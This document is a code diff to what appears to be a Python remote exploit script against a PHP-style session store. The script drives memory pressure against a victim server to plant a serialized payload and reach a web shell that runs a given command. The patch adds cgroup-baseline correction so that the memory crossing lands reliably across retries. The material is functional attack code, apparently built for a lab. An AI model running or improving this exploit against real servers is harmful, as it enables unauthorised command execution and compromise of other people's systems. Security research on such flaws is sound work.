@@ -45,6 +45,7 @@ F_MAX = 7_000_000              # per-filler field bytes (body < post_max_size)
 P_CARRIER_PROGRESS = 336       # carrier progress record length (fixed layout)
 P_START = P_CARRIER_PROGRESS + len(b"bio|s:") + len(str(lab.L1)) + len(':"')
 SHELL = lab.SHELL_URL_PATH
+H_MIN, H_MAX = 2_000_000, 30_000_000   # pressure bracket bounds
 
 
 # ------------------------------------------------------------------ HTTP I/O
@@ -260,7 +261,8 @@ def classify(rep: dict, c_len: int, r_len: int) -> tuple[str, int | None]:
     return "unknown", None
 
 
-def attempt(host: str, port: int, h: int, c_len: int, r_len: int) -> dict:
+def attempt(host: str, port: int, h: int, c_len: int, r_len: int,
+            b0_ref: int | None = None) -> dict:
     """One full remote attempt with pre-loaded pressure.
 
     h bytes of filler pressure are charged BEFORE the victim request, so the
@@ -305,6 +307,19 @@ def attempt(host: str, port: int, h: int, c_len: int, r_len: int) -> dict:
         except OSError:
             pass
         return res
+
+    # Live cgroup baseline from the phase-1 diagnostic report: correct the
+    # pressure for what THIS host/run actually has free before the victim
+    # starts, so the crossing lands in the same place despite inter-attempt
+    # baseline jitter (worker arena recycling moves it ~1-2MiB - enough to
+    # slide the ~2MiB window out from under a fixed pressure). Without the
+    # field (a real target) the nominal pressure is used unchanged.
+    b0 = rep.get("mem")
+    if b0:
+        res["b0"] = b0
+        if b0_ref:
+            h = max(H_MIN, min(H_MAX, h + (b0_ref - b0)))
+            res["h"] = h
 
     lab.store_bio(sid, build_payload())
     time.sleep(0.3)
@@ -411,11 +426,13 @@ def exploit(host: str, port: int, command: str, max_attempts: int = 40,
     last_signal = None         # "early" = too high | "low" = too low
     step = 4_000_000           # max proportional correction inside window
 
+    b0_ref = None          # first attempt's measured baseline (fresh target)
+
     for i in range(1, max_attempts + 1):
         if not wait_server(host, port):
             return {"error": "server unreachable"}
         try:
-            res = attempt(host, port, h, c_len, r_len)
+            res = attempt(host, port, h, c_len, r_len, b0_ref)
         except OSError as e:
             # Transient connection loss (e.g. the target is restarting after
             # an OOM): wait for it to come back and retry instead of dying.
@@ -424,6 +441,8 @@ def exploit(host: str, port: int, command: str, max_attempts: int = 40,
                       f"({type(e).__name__}) - waiting for target")
             wait_server(host, port, timeout=30)
             continue
+        if b0_ref is None and res.get("b0"):
+            b0_ref = res["b0"]      # anchor to the fresh target's baseline
         res["cmd"] = command
         if res.get("hit"):
             if verbose:
